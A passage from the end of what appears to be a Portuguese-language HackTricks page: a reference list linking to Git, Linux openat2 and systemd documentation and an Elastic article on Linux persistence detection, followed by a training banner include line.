- [31] [Documentação do `hash-object` do Git](https://git-scm.com/docs/git-hash-object)
- [32] [Documentação do `ls-tree` do Git](https://git-scm.com/docs/git-ls-tree)
- [33] [Documentação de configuração do Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — página de manual do Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Documentação do generator do systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — engenharia de detecção para Linux: mecanismos de persistência](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
